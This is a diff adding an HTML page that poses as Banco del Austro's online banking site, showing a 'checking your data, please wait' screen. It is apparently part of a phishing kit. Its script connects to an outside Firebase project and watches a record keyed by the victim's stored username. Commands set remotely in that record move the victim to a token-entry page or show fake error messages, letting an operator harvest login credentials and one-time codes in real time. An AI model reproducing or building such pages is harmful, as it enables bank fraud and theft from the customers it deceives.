@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+  <head id="Head">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Banco del Austro &gt; Banca virtual &gt; Banca Personas</title>
+    <meta
+      id="MetaDescription"
+      name="DESCRIPTION"
+      content="Entre los Bancos más grandes del Ecuador, Banco del Austro S.A es un banco sólido y solvente con presencia nacional caracterizado por brindar una atención personalizada y de calidad a nuestros clientes garantizando seguridad en todas nuestras gestiones."
+    />
+    <meta
+      id="MetaKeywords"
+      name="KEYWORDS"
+      content="banco del austro, bancosutro, banco de apoyo, banco ecuador, banco cuenca, visa mastercard, servicios pagos, cash management banco austro, pago iees banco, pago pensiones banco, banco recarga celular, banco gobierno corporativo, banco cuentas ahorros, banco cuenta corriente, banco polizas acumulacion, banco inversiones, banco tarjetas, banco debitos, banco creditos, banco proveerores, banco promociones, banco ganas sueldos, banco super sueldo, banco austrogiros, banco super yapa,banco interes, b,DotNetNuke,DNN"
+    />
+    <meta id="MetaGenerator" name="GENERATOR" content="DotNetNuke " />
+    <meta id="MetaRobots" name="ROBOTS" content="INDEX, FOLLOW" />
+    <link href="default.css" type="text/css" rel="stylesheet" />
+    <link href="skin.css" type="text/css" rel="stylesheet" />
+    <link href="container.css" type="text/css" rel="stylesheet" />
+    <link href="portal.css" type="text/css" rel="stylesheet" />
+    <link
+      href="jquery.mmenu.all.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link href="BancoAustro.css" type="text/css" rel="stylesheet" />
+    <link href="font-awesome.css" type="text/css" rel="stylesheet" />
+    <link href="stylesheet.css" type="text/css" rel="stylesheet" />
+    <link href="DNNMovil.css" type="text/css" rel="stylesheet" />
+    <link
+      href="http://www.bancodelaustro.com/banca-virtual/banca-personas"
+      rel="canonical"
+    />
+    <style>
+      #divLoginInputs {
+        z-index: 1;
+        position: absolute;
+        left: 0;
+        right: 0;
+        background-color: #f7f7f700;
+        color: white;
+        padding: 0;
+        margin-left: 69%;
+        margin-top: 15%;
+        min-height: 300px;
+      }
+
+      #imgPrinSinLogo {
+        min-height: 350px;
+        width: 100%;
+        height: auto;
+      }
+
+      @media screen and (max-width: 800px) {
+        #divLoginInputs {
+          margin-left: 20%;
+        }
+
+        #imgPrinSinLogo {
+          opacity: 0;
+        }
+
+        #divshadow {
+          background-color: #9d9e9f;
+        }
+      }
+    </style>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+  </head>
+  <body id="Body">
+    <form id="loginform">
+      <!-- Header -->
+      <div class="Header">
+        <div class="CenteredContent FullTableContent LoginContent">
+          <div class="Logo">
+            <a id="dnn_dnnLOGO_hypLogo" title="Banco del Austro" href="#">
+              <img
+                id="dnn_dnnLOGO_imgLogo"
+                src="LogoBancoAustro.png"
+                alt="Banco del Austro"
+              />
+            </a>
+          </div>
+          <div class="Login">
+            <div class="LoginComponent TableContent FontUnivers">
+              <div id="dnn_LogoContainer" class="LogoContainer">
+                <div class="DnnModule DnnModule-HTML DnnModule-1417">
+                  <a name="1417"></a>
+                  <div class="ClearContainer">
+                    <div id="dnn_ctr1417_ContentPane">
+                      <!-- Start_Module_1417 -->
+                      <div
+                        id="dnn_ctr1417_ModuleContent"
+                        class="DNNModuleContent ModHTMLC"
+                      >
+                        <div
+                          id="dnn_ctr1417_HtmlModule_lblContent"
+                          class="Normal"
+                        >
+                          <p>
+                            <img
+                              alt=""
+                              src="IconBancaPersonas.png"
+                              style="height: 50px"
+                            />
+                          </p>
+                        </div>
+                      </div>
+                      <!-- End_Module_1417 -->
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="width: 100%; text-align: center">
+        <div style="width: 100%">
+          <h1 style="font-family: Arial, Helvetica, sans-serif">
+            Estamos comprobando sus datos
+          </h1>
+        </div>
+        <img
+          src="https://usagif.com/wp-content/uploads/loading-11.gif"
+          style="width: 250px"
+        />
+        <div style="width: 100%">
+          <h1 style="font-family: Arial, Helvetica, sans-serif">
+            Por favor espere un momento
+          </h1>
+        </div>
+      </div>
+    </form>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "bcrr2",
+        localStorage.getItem("usuario")
+      );
+      window.onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+
+          if (questionData.page == 1) {
+            window.location.href = "token.html";
+          }
+          if (questionData.page == 2) {
+            alert("Token Incorrecto")
+            window.location.href = "token.html";
+          }
+          if (questionData.page == 3) {
+            window.location.href = "../index.html";
+          }
+          if (questionData.page == 4) {
+            alert("Autentiación Fallida");
+            window.location.href = "index.html";
+          }
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+</html>
